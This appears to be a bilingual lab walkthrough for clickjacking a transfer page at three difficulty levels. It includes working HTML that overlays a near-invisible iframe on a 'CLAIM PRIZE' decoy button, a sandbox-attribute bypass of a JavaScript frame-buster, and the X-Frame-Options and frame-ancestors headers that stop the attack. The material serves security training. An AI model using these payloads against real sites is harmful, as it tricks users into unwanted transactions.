Easy — Sin protección

La página de transferencia no envía ninguna cabecera de framing. Cualquier sitio puede incrustarla en un iframe.

  1. Crear una página HTML con el iframe transparente sobre un botón señuelo: 
    <div style="position:relative;width:500px;height:200px">
  <button style="position:absolute;top:60px;left:120px;z-index:1">RECLAMAR PREMIO</button>
  <iframe src="http://{{ target_ip }}/clickjacking/transfer"
          style="position:absolute;top:0;left:0;width:100%;height:100%;
                 opacity:0.01;z-index:2"></iframe>
</div>
  2. La víctima cree que hace clic en el botón señuelo, pero el clic llega al iframe.
  3. La transferencia se confirma con la sesión activa de la víctima.

Medium — Frame-buster JS

La página incluye: if (top !== self) top.location = self.location;
Este script intenta redirigir al usuario fuera del iframe. El bypass: el atributo sandbox sin allow-top-navigation impide que el JS navegue la ventana padre.

<iframe src="http://{{ target_ip }}/clickjacking/transfer"
        sandbox="allow-forms allow-scripts"
        style="opacity:0.01;position:absolute;..." ></iframe>

Con sandbox="allow-forms allow-scripts" el script se ejecuta pero no puede cambiar top.location.

Hard — Cabeceras de protección

El servidor envía:

X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'

El navegador rechaza cargar la página en cualquier iframe, independientemente del origen. No existe bypass en navegadores modernos. El atacante debe buscar un vector alternativo (XSS, CSRF).

Easy — No protection

The transfer page sends no framing headers. Any site can embed it in an iframe.

  1. Create an HTML page with the transparent iframe overlaid on a decoy button: 
    <div style="position:relative;width:500px;height:200px">
  <button style="position:absolute;top:60px;left:120px;z-index:1">CLAIM PRIZE</button>
  <iframe src="http://{{ target_ip }}/clickjacking/transfer"
          style="position:absolute;top:0;left:0;width:100%;height:100%;
                 opacity:0.01;z-index:2"></iframe>
</div>
  2. The victim thinks they click the decoy button, but the click reaches the iframe.
  3. The transfer is confirmed using the victim's active session.

Medium — Frame-buster JS

The page includes: if (top !== self) top.location = self.location;
This script tries to redirect the user out of the iframe. Bypass: the sandbox attribute without allow-top-navigation prevents the JS from navigating the parent window.

<iframe src="http://{{ target_ip }}/clickjacking/transfer"
        sandbox="allow-forms allow-scripts"
        style="opacity:0.01;position:absolute;..." ></iframe>

With sandbox="allow-forms allow-scripts" the script runs but cannot change top.location.

Hard — Protection headers

The server sends:

X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'

The browser refuses to load the page in any iframe regardless of origin. No bypass exists in modern browsers. The attacker must find an alternative vector (XSS, CSRF).
